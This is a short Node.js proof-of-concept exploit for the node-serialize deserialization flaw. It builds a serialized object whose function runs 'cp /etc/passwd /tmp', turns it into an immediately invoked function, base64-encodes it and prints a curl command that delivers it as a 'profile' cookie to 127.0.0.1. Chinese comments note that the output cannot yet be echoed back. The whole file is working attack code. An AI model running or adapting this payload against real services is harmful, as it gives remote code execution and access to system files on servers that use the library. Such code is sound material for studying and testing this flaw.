var serialize = require('node-serialize')

var test = {
  rce: function() {
    require('child_process').exec('cp /etc/passwd /tmp', function(error, stdout, stderr) {
    	// res 对象被隔离了，需要再研究下，所以无法直接回显
    	// res.send("stdout=", stdout)
    	// res.send("stderr=", stderr)
    })
  }
}

var payload = serialize.serialize(test).replace('}"}', '}()"}')
var base64  = Buffer.from(payload).toString("base64")
var curl    = 'curl 127.0.0.1 -H "Cookie: profile=' + base64.replace('=', '%3D') + '"'

console.log(curl)
